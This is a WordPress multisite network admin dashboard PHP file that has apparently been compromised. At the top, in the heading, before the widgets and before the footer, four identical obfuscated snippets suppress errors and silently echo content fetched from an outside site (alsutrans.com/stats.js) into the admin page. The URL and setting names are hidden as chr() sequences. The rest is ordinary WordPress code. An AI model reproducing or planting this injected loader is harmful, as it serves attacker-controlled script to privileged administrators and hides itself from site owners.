<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php
/**
 * Multisite administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

/** Load WordPress dashboard API */
require_once( ABSPATH . 'wp-admin/includes/dashboard.php' );

if ( ! current_user_can( 'manage_network' ) )
	wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );

$title = __( 'Dashboard' );
$parent_file = 'index.php';

$overview = '<p>' . __( 'Welcome to your Network Admin. This area of the Administration Screens is used for managing all aspects of your Multisite Network.' ) . '</p>';
$overview .= '<p>' . __( 'From here you can:' ) . '</p>';
$overview .= '<ul><li>' . __( 'Add and manage sites or users' ) . '</li>';
$overview .= '<li>' . __( 'Install and activate themes or plugins' ) . '</li>';
$overview .= '<li>' . __( 'Update your network' ) . '</li>';
$overview .= '<li>' . __( 'Modify global network settings' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __( 'Overview' ),
	'content' => $overview
) );

$quick_tasks = '<p>' . __( 'The Right Now widget on this screen provides current user and site counts on your network.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( 'To add a new user, <strong>click Create a New User</strong>.' ) . '</li>';
$quick_tasks .= '<li>' . __( 'To add a new site, <strong>click Create a New Site</strong>.' ) . '</li></ul>';
$quick_tasks .= '<p>' . __( 'To search for a user or site, use the search boxes.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( 'To search for a user, <strong>enter an email address or username</strong>. Use a wildcard to search for a partial username, such as user&#42;.' ) . '</li>';
$quick_tasks .= '<li>' . __( 'To search for a site, <strong>enter the path or domain</strong>.' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'quick-tasks',
	'title'   => __( 'Quick Tasks' ),
	'content' => $quick_tasks
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Network_Admin">Documentation on the Network Admin</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>') . '</p>'
);

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );
wp_enqueue_script( 'plugin-install' );
add_thickbox();

require_once( ABSPATH . 'wp-admin/admin-header.php' );

?>

<div class="wrap">
<h1><?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php echo esc_html( $title ); ?></h1>

<div id="dashboard-widgets-wrap">

<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php wp_dashboard(); ?>

<div class="clear"></div>
</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php
wp_print_community_events_templates();
include( ABSPATH . 'wp-admin/admin-footer.php' );